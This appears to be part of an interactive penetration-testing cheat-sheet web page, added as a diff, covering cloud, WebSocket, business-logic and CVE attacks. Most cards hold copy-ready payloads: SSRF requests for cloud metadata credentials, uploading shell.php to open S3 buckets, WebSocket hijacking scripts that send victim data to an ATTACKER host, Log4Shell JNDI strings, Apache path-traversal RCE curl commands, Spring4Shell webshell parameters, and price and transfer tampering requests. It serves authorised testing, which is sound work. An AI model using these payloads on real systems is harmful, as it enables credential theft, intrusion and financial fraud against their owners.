+<button onclick="pathPrev(this)" style="flex-shrink:0;background:var(--panel2);border:1px solid var(--border2);color:var(--dim);width:28px;height:28px;border-radius:4px;cursor:pointer;font-size:16px;font-family:monospace;transition:all .2s;display:flex;align-items:center;justify-content:center;" onmouseover="this.style.color='var(--accent)';this.style.borderColor='var(--accent)'" onmouseout="this.style.color='var(--dim)';this.style.borderColor='var(--border2)'">&#8249;</button>
+<div class="pathway" style="flex:1;margin-bottom:0;">
+  <div class="pstep current" onclick="stepClick(this)"><div class="ps-num">1</div><div class="ps-lbl">Identify Cloud</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">2</div><div class="ps-lbl">Metadata / Creds</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">3</div><div class="ps-lbl">Enumerate IAM</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">4</div><div class="ps-lbl">S3 / Storage</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">5</div><div class="ps-lbl">Serverless Abuse</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">6</div><div class="ps-lbl">Pivot / Escalate</div></div>
+</div>
+<button onclick="pathNext(this)" style="flex-shrink:0;background:var(--panel2);border:1px solid var(--border2);color:var(--dim);width:28px;height:28px;border-radius:4px;cursor:pointer;font-size:16px;font-family:monospace;transition:all .2s;display:flex;align-items:center;justify-content:center;" onmouseover="this.style.color='var(--accent)';this.style.borderColor='var(--accent)'" onmouseout="this.style.color='var(--dim)';this.style.borderColor='var(--border2)'">&#8250;</button>
+</div>
+<div class="mhd">AWS Attacks</div>
+<div class="cgrid">
+<div class="card" data-sev="critical" data-id="cl1">
+  <div class="card-hd"><span class="ctitle">AWS Metadata + Credential Theft</span><div class="card-prog"><button class="cp-btn" onclick="markCard('cl1','tested',this)">✓</button><button class="cp-btn" onclick="markCard('cl1','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('cl1','na',this)">N/A</button></div><span class="sev sc">CRITICAL</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)"># IMDSv1 (no auth) — via SSRF
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
+http://169.254.169.254/latest/user-data/
+# IMDSv2 (requires token header, but if X-Forwarded-For works...)
+# Get token first, then use it</div>
+<div class="cmd" onclick="cp(this)">curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2&gt;/dev/null</div>
+  </div>
+</div>
+<div class="card" data-sev="critical" data-id="cl2">
+  <div class="card-hd"><span class="ctitle">AWS IAM Enumeration + PrivEsc</span><div class="card-prog"><button class="cp-btn" onclick="markCard('cl2','tested',this)">✓</button><button class="cp-btn" onclick="markCard('cl2','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('cl2','na',this)">N/A</button></div><span class="sev sc">CRITICAL</span></div>
+  <div class="card-bd">
+<div class="cmd" onclick="cp(this)">aws sts get-caller-identity</div>
+<div class="cmd" onclick="cp(this)">aws iam list-users</div>
+<div class="cmd" onclick="cp(this)">aws iam list-attached-user-policies --user-name TARGET_USER</div>
+<div class="cmd" onclick="cp(this)">aws iam get-policy-version --policy-arn ARN --version-id v1</div>
+<div class="cmd" onclick="cp(this)">python3 enumerate-iam.py --access-key AKID --secret-key SECRET</div>
+<div class="cmd" onclick="cp(this)">python3 pacu.py  # AWS exploitation framework</div>
+<div class="note">Look for: iam:PassRole, iam:CreatePolicyVersion, lambda:CreateFunction, ec2:RunInstances</div>
+  </div>
+</div>
+<div class="card" data-sev="critical" data-id="cl3">
+  <div class="card-hd"><span class="ctitle">S3 Bucket Attacks</span><div class="card-prog"><button class="cp-btn" onclick="markCard('cl3','tested',this)">✓</button><button class="cp-btn" onclick="markCard('cl3','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('cl3','na',this)">N/A</button></div><span class="sev sc">CRITICAL</span></div>
+  <div class="card-bd">
+<div class="cmd" onclick="cp(this)">aws s3 ls s3://bucket-name --no-sign-request</div>
+<div class="cmd" onclick="cp(this)">aws s3 cp s3://bucket-name/secret.txt . --no-sign-request</div>
+<div class="cmd" onclick="cp(this)">aws s3 cp ./shell.php s3://bucket-name/ --no-sign-request</div>
+<div class="cmd" onclick="cp(this)">python3 slurp.py domain -t TARGET.com</div>
+<div class="cmd" onclick="cp(this)">nuclei -u https://TARGET -t misconfiguration/aws-</div>
+<div class="payload" onclick="cp(this)"># Bucket name permutations
+TARGET-backup  TARGET-dev  TARGET-staging
+TARGET-prod  TARGET-assets  TARGET-uploads
+TARGET-data  TARGET.com  www.TARGET</div>
+  </div>
+</div>
+<div class="card" data-sev="high" data-id="cl4">
+  <div class="card-hd"><span class="ctitle">Lambda + API Gateway Abuse</span><div class="card-prog"><button class="cp-btn" onclick="markCard('cl4','tested',this)">✓</button><button class="cp-btn" onclick="markCard('cl4','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('cl4','na',this)">N/A</button></div><span class="sev sh">HIGH</span></div>
+  <div class="card-bd">
+<div class="cmd" onclick="cp(this)">aws lambda list-functions</div>
+<div class="cmd" onclick="cp(this)">aws lambda get-function --function-name FUNCNAME</div>
+<div class="cmd" onclick="cp(this)">aws lambda get-function-configuration --function-name FUNCNAME</div>
+<div class="payload" onclick="cp(this)"># Environment variables leak (often contains DB creds, API keys)
+aws lambda get-function-configuration --function-name FUNCNAME | jq '.Environment'
+# Invoke function directly if you have lambda:InvokeFunction
+aws lambda invoke --function-name FUNCNAME --payload '{}' output.json</div>
+  </div>
+</div>
+</div>
+<div class="mhd">GCP / Azure Attacks</div>
+<div class="cgrid">
+<div class="card" data-sev="critical" data-id="cl5">
+  <div class="card-hd"><span class="ctitle">GCP Metadata + Enumeration</span><div class="card-prog"><button class="cp-btn" onclick="markCard('cl5','tested',this)">✓</button><button class="cp-btn" onclick="markCard('cl5','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('cl5','na',this)">N/A</button></div><span class="sev sc">GCP</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)"># Via SSRF (requires Metadata-Flavor: Google header)
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://metadata.google.internal/computeMetadata/v1/project/project-id</div>
+<div class="cmd" onclick="cp(this)">gcloud auth list</div>
+<div class="cmd" onclick="cp(this)">gcloud projects list</div>
+<div class="cmd" onclick="cp(this)">gcloud storage buckets list --project PROJECT_ID</div>
+<div class="cmd" onclick="cp(this)">python3 gcp_enum.py --project PROJECT_ID</div>
+  </div>
+</div>
+<div class="card" data-sev="critical" data-id="cl6">
+  <div class="card-hd"><span class="ctitle">Azure Metadata + Enumeration</span><div class="card-prog"><button class="cp-btn" onclick="markCard('cl6','tested',this)">✓</button><button class="cp-btn" onclick="markCard('cl6','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('cl6','na',this)">N/A</button></div><span class="sev sc">AZURE</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)"># Via SSRF (requires Metadata: true header)
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://management.azure.com/</div>
+<div class="cmd" onclick="cp(this)">az account list</div>
+<div class="cmd" onclick="cp(this)">az role assignment list --all</div>
+<div class="cmd" onclick="cp(this)">python3 roadrecon.py gather</div>
+<div class="note">Check Azure Storage blobs: target.blob.core.windows.net/$web/</div>
+  </div>
+</div>
+</div>
+</div>
+
+<!-- ░░ WEBSOCKET ░░ -->
+<div id="sec-ws" class="section">
+<div class="shdr"><div class="sico">📡</div><div><div class="stitle">WEBSOCKET ATTACKS</div><div class="sdesc">// interception — origin bypass — injection — CSWSH — message fuzzing — smuggling</div></div></div>
+<div class="pathway-title">Attack Pathway</div>
+<div style="display:flex;align-items:center;gap:8px;margin-bottom:26px;">
+<button onclick="pathPrev(this)" style="flex-shrink:0;background:var(--panel2);border:1px solid var(--border2);color:var(--dim);width:28px;height:28px;border-radius:4px;cursor:pointer;font-size:16px;font-family:monospace;transition:all .2s;display:flex;align-items:center;justify-content:center;" onmouseover="this.style.color='var(--accent)';this.style.borderColor='var(--accent)'" onmouseout="this.style.color='var(--dim)';this.style.borderColor='var(--border2)'">&#8249;</button>
+<div class="pathway" style="flex:1;margin-bottom:0;">
+  <div class="pstep current" onclick="stepClick(this)"><div class="ps-num">1</div><div class="ps-lbl">Intercept WSS</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">2</div><div class="ps-lbl">Origin Check</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">3</div><div class="ps-lbl">Auth Testing</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">4</div><div class="ps-lbl">Message Fuzz</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">5</div><div class="ps-lbl">Injection</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">6</div><div class="ps-lbl">CSWSH / XSS</div></div>
+</div>
+<button onclick="pathNext(this)" style="flex-shrink:0;background:var(--panel2);border:1px solid var(--border2);color:var(--dim);width:28px;height:28px;border-radius:4px;cursor:pointer;font-size:16px;font-family:monospace;transition:all .2s;display:flex;align-items:center;justify-content:center;" onmouseover="this.style.color='var(--accent)';this.style.borderColor='var(--accent)'" onmouseout="this.style.color='var(--dim)';this.style.borderColor='var(--border2)'">&#8250;</button>
+</div>
+<div class="cgrid">
+<div class="card" data-sev="medium" data-id="ws1">
+  <div class="card-hd"><span class="ctitle">WebSocket Interception Setup</span><div class="card-prog"><button class="cp-btn" onclick="markCard('ws1','tested',this)">✓</button><button class="cp-btn" onclick="markCard('ws1','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('ws1','na',this)">N/A</button></div><span class="sev sm">SETUP</span></div>
+  <div class="card-bd">
+<div class="desc">Burp Suite intercepts WebSocket messages natively — enable in Proxy &gt; WebSockets history.</div>
+<div class="cmd" onclick="cp(this)">websocat ws://TARGET/ws -v</div>
+<div class="cmd" onclick="cp(this)">websocat wss://TARGET/socket --insecure</div>
+<div class="cmd" onclick="cp(this)">wscat -c wss://TARGET/ws -H "Cookie: session=TOKEN"</div>
+<div class="note">In Burp: right-click WebSocket message → "Send to Repeater" for manual replay and modification.</div>
+  </div>
+</div>
+<div class="card" data-sev="high" data-id="ws2">
+  <div class="card-hd"><span class="ctitle">Origin Bypass + Auth Testing</span><div class="card-prog"><button class="cp-btn" onclick="markCard('ws2','tested',this)">✓</button><button class="cp-btn" onclick="markCard('ws2','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('ws2','na',this)">N/A</button></div><span class="sev sh">HIGH</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)"># If Origin not validated, connect from any page:
+var ws = new WebSocket('wss://TARGET/ws');
+ws.onopen = () =&gt; ws.send(JSON.stringify({type:'auth',token:'STOLEN_TOKEN'}));
+ws.onmessage = (e) =&gt; fetch('https://ATTACKER/?d='+btoa(e.data));
+
+# Test with wrong/missing Origin header
+Origin: https://ATTACKER.com
+Origin: null
+
+# No auth token in WS handshake? Try connecting without cookie
+# Re-use WS connection after logout (session persistence bug)</div>
+  </div>
+</div>
+<div class="card" data-sev="critical" data-id="ws3">
+  <div class="card-hd"><span class="ctitle">WebSocket Injection Attacks</span><div class="card-prog"><button class="cp-btn" onclick="markCard('ws3','tested',this)">✓</button><button class="cp-btn" onclick="markCard('ws3','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('ws3','na',this)">N/A</button></div><span class="sev sc">INJECTION</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)"># SQLi via WebSocket message
+{"type":"search","query":"' OR 1=1-- -"}
+# XSS via WebSocket (reflected to other users)
+{"type":"chat","message":"&lt;script&gt;alert(1)&lt;/script&gt;"}
+# Command injection
+{"type":"ping","host":"127.0.0.1; id"}
+# SSTI
+{"type":"render","template":"{{7*7}}"}
+# Path traversal in file requests
+{"type":"file","path":"../../../../etc/passwd"}</div>
+  </div>
+</div>
+<div class="card" data-sev="high" data-id="ws4">
+  <div class="card-hd"><span class="ctitle">CSWSH — Cross-Site WebSocket Hijacking</span><div class="card-prog"><button class="cp-btn" onclick="markCard('ws4','tested',this)">✓</button><button class="cp-btn" onclick="markCard('ws4','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('ws4','na',this)">N/A</button></div><span class="sev sh">CSWSH</span></div>
+  <div class="card-bd">
+<div class="desc">If WS auth relies on cookies only (no CSRF token), attacker can hijack the connection from a cross-origin page.</div>
+<div class="payload" onclick="cp(this)">&lt;!-- Attacker page --&gt;
+&lt;script&gt;
+var ws = new WebSocket('wss://TARGET/ws');
+ws.onopen = function() {
+  ws.send('{"action":"getAccountDetails"}');
+};
+ws.onmessage = function(e) {
+  fetch('https://ATTACKER/steal?d=' + btoa(e.data));
+};
+&lt;/script&gt;</div>
+<div class="note">Fix requires CSRF token in the WebSocket handshake or in each message.</div>
+  </div>
+</div>
+<div class="card" data-sev="advanced" data-id="ws5">
+  <div class="card-hd"><span class="ctitle">WebSocket Message Fuzzing</span><div class="card-prog"><button class="cp-btn" onclick="markCard('ws5','tested',this)">✓</button><button class="cp-btn" onclick="markCard('ws5','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('ws5','na',this)">N/A</button></div><span class="sev sa">ADVANCED</span></div>
+  <div class="card-bd">
+<div class="cmd" onclick="cp(this)">python3 wsfuzz.py -u wss://TARGET/ws -p '{"id":"FUZZ"}' -w ids.txt</div>
+<div class="payload" onclick="cp(this)"># Mass assignment in WS messages
+{"action":"updateProfile","data":{"name":"x"}}
+→ {"action":"updateProfile","data":{"name":"x","role":"admin"}}
+# IDOR via WS
+{"action":"getUser","userId":1337}
+→ {"action":"getUser","userId":1336}
+# Replay old messages (no sequence/nonce validation)
+# Oversize messages (DoS via large payload)</div>
+  </div>
+</div>
+</div>
+</div>
+
+<!-- ░░ BUSINESS LOGIC ░░ -->
+<div id="sec-bizlogic" class="section">
+<div class="shdr"><div class="sico">🏦</div><div><div class="stitle">BUSINESS LOGIC TESTING</div><div class="sdesc">// e-commerce — banking — SaaS — healthcare — workflow bypass — state manipulation</div></div></div>
+<div class="pathway-title">Attack Pathway</div>
+<div style="display:flex;align-items:center;gap:8px;margin-bottom:26px;">
+<button onclick="pathPrev(this)" style="flex-shrink:0;background:var(--panel2);border:1px solid var(--border2);color:var(--dim);width:28px;height:28px;border-radius:4px;cursor:pointer;font-size:16px;font-family:monospace;transition:all .2s;display:flex;align-items:center;justify-content:center;" onmouseover="this.style.color='var(--accent)';this.style.borderColor='var(--accent)'" onmouseout="this.style.color='var(--dim)';this.style.borderColor='var(--border2)'">&#8249;</button>
+<div class="pathway" style="flex:1;margin-bottom:0;">
+  <div class="pstep current" onclick="stepClick(this)"><div class="ps-num">1</div><div class="ps-lbl">Map Workflows</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">2</div><div class="ps-lbl">Identify Trust</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">3</div><div class="ps-lbl">Skip Steps</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">4</div><div class="ps-lbl">Tamper Values</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">5</div><div class="ps-lbl">Race Conditions</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">6</div><div class="ps-lbl">State Confusion</div></div>
+</div>
+<button onclick="pathNext(this)" style="flex-shrink:0;background:var(--panel2);border:1px solid var(--border2);color:var(--dim);width:28px;height:28px;border-radius:4px;cursor:pointer;font-size:16px;font-family:monospace;transition:all .2s;display:flex;align-items:center;justify-content:center;" onmouseover="this.style.color='var(--accent)';this.style.borderColor='var(--accent)'" onmouseout="this.style.color='var(--dim)';this.style.borderColor='var(--border2)'">&#8250;</button>
+</div>
+<div class="mhd">E-Commerce Logic Flaws</div>
+<div class="cgrid">
+<div class="card" data-sev="critical" data-id="bl1">
+  <div class="card-hd"><span class="ctitle">Price / Payment Manipulation</span><div class="card-prog"><button class="cp-btn" onclick="markCard('bl1','tested',this)">✓</button><button class="cp-btn" onclick="markCard('bl1','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('bl1','na',this)">N/A</button></div><span class="sev sc">CRITICAL</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)"># Tamper price in request
+POST /cart/checkout
+{"item":"laptop","qty":1,"price":999.99}
+→ {"item":"laptop","qty":1,"price":0.01}
+
+# Negative quantity → credit
+{"item":"laptop","qty":-1}
+
+# Currency confusion
+{"amount":100,"currency":"USD"} → {"amount":100,"currency":"JPY"}
+
+# Integer overflow (very large number)
+{"qty": 99999999999}
+
+# Apply coupon multiple times (race condition)
+# Send 10 simultaneous requests to /apply-coupon
+
+# Zero-value cart checkout
+DELETE all items after adding, then attempt checkout</div>
+  </div>
+</div>
+<div class="card" data-sev="high" data-id="bl2">
+  <div class="card-hd"><span class="ctitle">Coupon / Promo Abuse</span><div class="card-prog"><button class="cp-btn" onclick="markCard('bl2','tested',this)">✓</button><button class="cp-btn" onclick="markCard('bl2','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('bl2','na',this)">N/A</button></div><span class="sev sh">HIGH</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)"># Apply same coupon multiple times (race condition)
+# Stack multiple coupons in single request
+{"coupons": ["SAVE10","SAVE10","SAVE10"]}
+# Reuse expired coupon (check server-side expiry?)
+{"code":"EXPIRED2020"}
+# Bypass one-use-per-account
+Register new account with +alias: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="83f5eae0f7eaeea8b2c3e4eee2eaefade0ecee">[email&#160;protected]</a>
+# Brute force coupon codes
+SAVE10, SAVE20, ... SAVE99  (sequential pattern?)</div>
+  </div>
+</div>
+<div class="card" data-sev="high" data-id="bl3">
+  <div class="card-hd"><span class="ctitle">Order / Workflow Bypass</span><div class="card-prog"><button class="cp-btn" onclick="markCard('bl3','tested',this)">✓</button><button class="cp-btn" onclick="markCard('bl3','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('bl3','na',this)">N/A</button></div><span class="sev sh">HIGH</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)"># Skip payment step — go directly to order confirmation
+POST /checkout/step1 → skip → POST /checkout/confirm
+# Replay refund request
+POST /refund {"orderId":"completed_order"}
+# Modify order after payment
+PUT /order/1337 {"status":"shipped","address":"attacker_addr"}
+# Replay webhook (payment confirmed signal)
+POST /webhook/payment-success {"orderId":"1337","status":"paid"}</div>
+  </div>
+</div>
+</div>
+<div class="mhd">Banking / Financial Logic</div>
+<div class="cgrid">
+<div class="card" data-sev="critical" data-id="bl4">
+  <div class="card-hd"><span class="ctitle">Transfer / Balance Manipulation</span><div class="card-prog"><button class="cp-btn" onclick="markCard('bl4','tested',this)">✓</button><button class="cp-btn" onclick="markCard('bl4','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('bl4','na',this)">N/A</button></div><span class="sev sc">CRITICAL</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)"># Negative transfer (receive instead of send)
+POST /transfer {"from":"victim","to":"attacker","amount":-100}
+# Transfer more than balance (no server-side check?)
+POST /transfer {"amount": 999999}
+# Transfer to self (double funds?)
+POST /transfer {"from":"my_acc","to":"my_acc","amount":100}
+# Rounding exploit (0.001 × 1000 transactions)
+POST /transfer {"amount": 0.001}  ×1000 times
+# Race condition: balance read before debit
+Send 5 simultaneous /transfer requests of full balance</div>
+  </div>
+</div>
+</div>
+<div class="mhd">SaaS / Multi-Tenant Logic</div>
+<div class="cgrid">
+<div class="card" data-sev="critical" data-id="bl5">
+  <div class="card-hd"><span class="ctitle">Tenant Isolation Bypass</span><div class="card-prog"><button class="cp-btn" onclick="markCard('bl5','tested',this)">✓</button><button class="cp-btn" onclick="markCard('bl5','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('bl5','na',this)">N/A</button></div><span class="sev sc">CRITICAL</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)"># Access another tenant's data
+GET /api/data?tenant_id=VICTIM_TENANT_ID
+# Switch org in JWT claim
+{"org":"my_org"} → {"org":"victim_org"}
+# Subdomain tenant swap
+victim.saas.com  (register as "victim" tenant?)
+# Shared resource access
+GET /api/reports/annual → returns all tenants?
+# Plan feature bypass
+{"plan":"free"} → {"plan":"enterprise"}
+POST /api/premium-feature  (just call it directly)</div>
+  </div>
+</div>
+<div class="card" data-sev="high" data-id="bl6">
+  <div class="card-hd"><span class="ctitle">Account Lifecycle Attacks</span><div class="card-prog"><button class="cp-btn" onclick="markCard('bl6','tested',this)">✓</button><button class="cp-btn" onclick="markCard('bl6','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('bl6','na',this)">N/A</button></div><span class="sev sh">HIGH</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)"># Register with existing admin email (pre-account takeover)
+# Password reset token reuse after use
+# Email change without re-verification
+# Account deletion + re-register = old data visible?
+# Merge accounts from different providers (OAuth linking)
+# Takeover via username claim on SSO
+# Invite yourself to higher-privilege workspace</div>
+  </div>
+</div>
+</div>
+</div>
+
+<!-- ░░ CVE QUICK-REF ░░ -->
+<div id="sec-cve" class="section">
+<div class="shdr"><div class="sico">💀</div><div><div class="stitle">CVE QUICK-REFERENCE</div><div class="sdesc">// critical web CVEs — one-click nuclei — detection commands — affected versions</div></div></div>
+<div class="mhd">Remote Code Execution CVEs</div>
+<div class="cgrid">
+<div class="card" data-sev="critical" data-id="cv1">
+  <div class="card-hd"><span class="ctitle">Log4Shell — CVE-2021-44228</span><div class="card-prog"><button class="cp-btn" onclick="markCard('cv1','tested',this)">✓</button><button class="cp-btn" onclick="markCard('cv1','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('cv1','na',this)">N/A</button></div><span class="sev sc">CVSS 10.0</span></div>
+  <div class="card-bd">
+<div class="desc">Log4j2 JNDI injection. Affects Log4j 2.0–2.14.1. Java apps everywhere.</div>
+<div class="payload" onclick="cp(this)">${jndi:ldap://ATTACKER/a}
+${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://ATTACKER/a}
+${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://ATTACKER/a}
+# Test in: User-Agent, X-Forwarded-For, Referer, username fields, ALL headers</div>
+<div class="cmd" onclick="cp(this)">nuclei -u https://TARGET -t cves/2021/CVE-2021-44228.yaml</div>
+<div class="cmd" onclick="cp(this)">java -jar log4shell-hunter.jar -u https://TARGET -c ATTACKER:1389</div>
+  </div>
+</div>
+<div class="card" data-sev="critical" data-id="cv2">
+  <div class="card-hd"><span class="ctitle">Spring4Shell — CVE-2022-22965</span><div class="card-prog"><button class="cp-btn" onclick="markCard('cv2','tested',this)">✓</button><button class="cp-btn" onclick="markCard('cv2','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('cv2','na',this)">N/A</button></div><span class="sev sc">CVSS 9.8</span></div>
+  <div class="card-bd">
+<div class="desc">Spring Framework RCE via data binding on JDK 9+. Affects Spring &lt; 5.3.18.</div>
+<div class="payload" onclick="cp(this)"># POST to any Spring MVC endpoint
+class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di+if(%22j%22.equals(request.getParameter(%22pwd%22))){...}+%25%7Bsuffix%7Di
+class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
+class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
+class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar
+class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=</div>
+<div class="cmd" onclick="cp(this)">nuclei -u https://TARGET -t cves/2022/CVE-2022-22965.yaml</div>
+  </div>
+</div>
+<div class="card" data-sev="critical" data-id="cv3">
+  <div class="card-hd"><span class="ctitle">Apache Path Traversal — CVE-2021-41773</span><div class="card-prog"><button class="cp-btn" onclick="markCard('cv3','tested',this)">✓</button><button class="cp-btn" onclick="markCard('cv3','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('cv3','na',this)">N/A</button></div><span class="sev sc">CVSS 9.8</span></div>
+  <div class="card-bd">
+<div class="desc">Apache 2.4.49 path traversal + RCE if mod_cgi enabled.</div>
+<div class="cmd" onclick="cp(this)">curl "https://TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"</div>
+<div class="cmd" onclick="cp(this)">curl -s --path-as-is -d "echo Content-Type: text/plain; echo; id" "https://TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"</div>
+<div class="cmd" onclick="cp(this)">nuclei -u https://TARGET -t cves/2021/CVE-2021-41773.yaml</div>
+  </div>
+</div>
+<div class="card" data-sev="critical" data-id="cv4">
+  <div class="card-hd"><span class="ctitle">MOVEit SQLi — CVE-2023-34362</span><div class="card-prog"><button class="cp-btn" onclick="markCard('cv4','tested',this)">✓</button><button class="cp-btn" onclick="markCard('cv4','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('cv4','na',this)">N/A</button></div><span class="sev sc">CVSS 9.8</span></div>
+  <div class="card-bd">
+<div class="desc">MOVEit Transfer pre-auth SQL injection → admin access → RCE via webshell.</div>
+<div class="cmd" onclick="cp(this)">nuclei -u https://TARGET -t cves/2023/CVE-2023-34362.yaml</div>
+<div class="cmd" onclick="cp(this)">curl -s "https://TARGET/guestaccess.aspx" -d "username=&amp;password=&amp;" -v 2&gt;&amp;1 | grep -i moveit</div>
+  </div>
+</div>
+<div class="card" data-sev="critical" data-id="cv5">
+  <div class="card-hd"><span class="ctitle">Confluence RCE — CVE-2023-22527</span><div class="card-prog"><button class="cp-btn" onclick="markCard('cv5','tested',this)">✓</button><button class="cp-btn" onclick="markCard('cv5','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('cv5','na',this)">N/A</button></div><span class="sev sc">CVSS 10.0</span></div>
+  <div class="card-bd">
+<div class="desc">OGNL injection in Confluence 8.x. Unauthenticated RCE.</div>
+<div class="cmd" onclick="cp(this)">nuclei -u https://TARGET -t cves/2023/CVE-2023-22527.yaml</div>
+<div class="payload" onclick="cp(this)">POST /template/aui/text-inline.vm HTTP/1.1
+label=%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29...%7D</div>
+  </div>
+</div>
+<div class="card" data-sev="critical" data-id="cv6">
+  <div class="card-hd"><span class="ctitle">GitLab RCE — CVE-2021-22205</span><div class="card-prog"><button class="cp-btn" onclick="markCard('cv6','tested',this)">✓</button><button class="cp-btn" onclick="markCard('cv6','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('cv6','na',this)">N/A</button></div><span class="sev sc">CVSS 10.0</span></div>
+  <div class="card-bd">
+<div class="desc">ExifTool RCE via image upload in GitLab &lt; 13.10.3. No auth required.</div>
+<div class="cmd" onclick="cp(this)">nuclei -u https://TARGET -t cves/2021/CVE-2021-22205.yaml</div>
+<div class="cmd" onclick="cp(this)">python3 CVE-2021-22205.py https://TARGET ATTACKER PORT</div>
+  </div>
+</div>
+</div>
+<div class="mhd">Auth / Deserialization / Other Critical CVEs</div>
+<div class="cgrid">
+<div class="card" data-sev="critical" data-id="cv7">
+  <div class="card-hd"><span class="ctitle">Citrix Bleed — CVE-2023-4966</span><div class="card-prog"><button class="cp-btn" onclick="markCard('cv7','tested',this)">✓</button><button class="cp-btn" onclick="markCard('cv7','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('cv7','na',this)">N/A</button></div><span class="sev sc">CVSS 9.4</span></div>
+  <div class="card-bd">
+<div class="desc">Citrix NetScaler session token leakage — hijack authenticated sessions without password.</div>
+<div class="cmd" onclick="cp(this)">nuclei -u https://TARGET -t cves/2023/CVE-2023-4966.yaml</div>
+<div class="cmd" onclick="cp(this)">python3 citrixbleed.py --url https://TARGET --output tokens.txt</div>
+  </div>
+</div>
+<div class="card" data-sev="critical" data-id="cv8">
+  <div class="card-hd"><span class="ctitle">Ivanti Auth Bypass — CVE-2023-46747</span><div class="card-prog"><button class="cp-btn" onclick="markCard('cv8','tested',this)">✓</button><button class="cp-btn" onclick="markCard('cv8','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('cv8','na',this)">N/A</button></div><span class="sev sc">CVSS 9.8</span></div>
+  <div class="card-bd">
+<div class="desc">Ivanti Connect Secure unauthenticated RCE. Chained with CVE-2023-46748.</div>
+<div class="cmd" onclick="cp(this)">nuclei -u https://TARGET -t cves/2023/CVE-2023-46747.yaml</div>
+<div class="cmd" onclick="cp(this)">curl -sk "https://TARGET/api/v1/totp/user-backup-code/../../license/keys-status/" | python3 -m json.tool</div>
+  </div>
+</div>
+</div>
+</div>
+
+<!-- ░░ TOOLBOX ░░ -->
+<div id="sec-toolbox" class="section">
+<div class="shdr"><div class="sico">🧰</div><div><div class="stitle">TOOLBOX REFERENCE</div><div class="sdesc">// essential tools — pipelines — wordlists — reverse shells — shell upgrade</div></div></div>
+<div class="cgrid">
+<div class="card" data-sev="info" data-id="tb1">
+  <div class="card-hd"><span class="ctitle">Nuclei Scanning</span><div class="card-prog"><button class="cp-btn" onclick="markCard('tb1','tested',this)">✓</button><button class="cp-btn" onclick="markCard('tb1','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('tb1','na',this)">N/A</button></div><span class="sev si">AUTOMATED</span></div>
+  <div class="card-bd">
+<div class="cmd" onclick="cp(this)">nuclei -u https://TARGET -t cves/ -severity critical,high -o nuclei.txt</div>
